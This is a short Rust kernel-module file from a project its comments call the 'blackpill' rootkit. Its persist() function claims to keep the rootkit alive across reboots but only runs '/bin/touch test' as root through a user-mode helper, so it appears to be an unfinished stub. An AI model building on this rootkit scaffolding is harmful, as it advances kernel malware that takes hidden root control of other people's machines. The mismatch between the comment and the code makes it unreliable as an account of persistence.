//! This module allows blackpill to be persitent across reboots.

use kernel::c_str;
use kernel::prelude::*;

use crate::utils::exec_as_root;

/// Persists the rootkit across reboots.
pub(crate) fn persist() {
    pr_info!("Persisting\n");

    // Execute the user-mode helper as root.
    let program_path = c_str!("/bin/touch");
    let args = c_str!("test");
    let ret: i32 = exec_as_root(program_path, args).expect("Failed to execute user-mode helper");

    pr_info!("echo rc = {}\n", ret);
}
